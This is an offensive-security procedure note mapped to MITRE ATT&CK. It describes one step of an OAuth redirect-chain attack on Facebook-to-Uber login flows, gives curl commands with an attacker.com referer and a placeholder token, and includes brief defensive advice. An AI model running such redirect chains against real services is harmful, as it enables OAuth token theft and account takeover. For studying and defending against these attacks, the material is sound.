---
tags:
  - redirect-chain
  - oauth
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-facebook-redirect]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:24:39.147Z'
sub_techniques: []
id: 5a1330e0-c9cf-4f10-bcfe-3daedad1a838
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Chain Redirect to Uber Auth Endpoint

## Summary

This procedure handles the redirect from Facebook to Uber's auth endpoint, preserving the next_url parameter to enable further chaining.

## Description

After victim authorization, Facebook redirects to the specified redirect_uri (https://auth.uber.com/login?next_url=https://login.uber.com/logout), which Uber accepts due to loose validation. The OAuth token is carried in the URL parameters, setting up the next redirect without interruption.

## Requirements

1. Successful Step 1 completion
2. Access to Uber's auth.uber.com endpoint
3. No additional credentials

## Defense

Defensive measures and detection strategies:

- Validate redirect_uris against a strict allowlist
- Log and alert on unexpected OAuth redirects
- Use state parameters to prevent chaining attacks

## Objectives

1. Complete Facebook-to-Uber redirect
2. Maintain token in transit
3. Chain to internal Uber endpoint

## Instructions

### Step 1: Follow Facebook Redirect

**Context**: Simulate the post-authorization redirect from Facebook.

**Command** ([[commands/curl-facebook-redirect]]):
```bash
curl -L "https://www.facebook.com/v18.0/dialog/oauth?client_id=UBER_APP_ID&redirect_uri=https://auth.uber.com/login?next_url=https://login.uber.com/logout&scope=public_profile,email&response_type=token" -H "Referer: https://attacker.com" -v
```

> -L follows redirects. Expected: 302 to auth.uber.com/login?next_url=... with token.

### Step 2: Verify Parameter Preservation

**Context**: Ensure next_url and token are intact.

**Command** ([[commands/curl-facebook-redirect]]):
```bash
curl "https://auth.uber.com/login?next_url=https://login.uber.com/logout&access_token=FAKE_TOKEN" -v
```

> Check response for further redirect. Success: No 4xx errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/curl-facebook-redirect]]

## Tools Used


## Tags

- redirect-chain
- oauth
- web-exploit
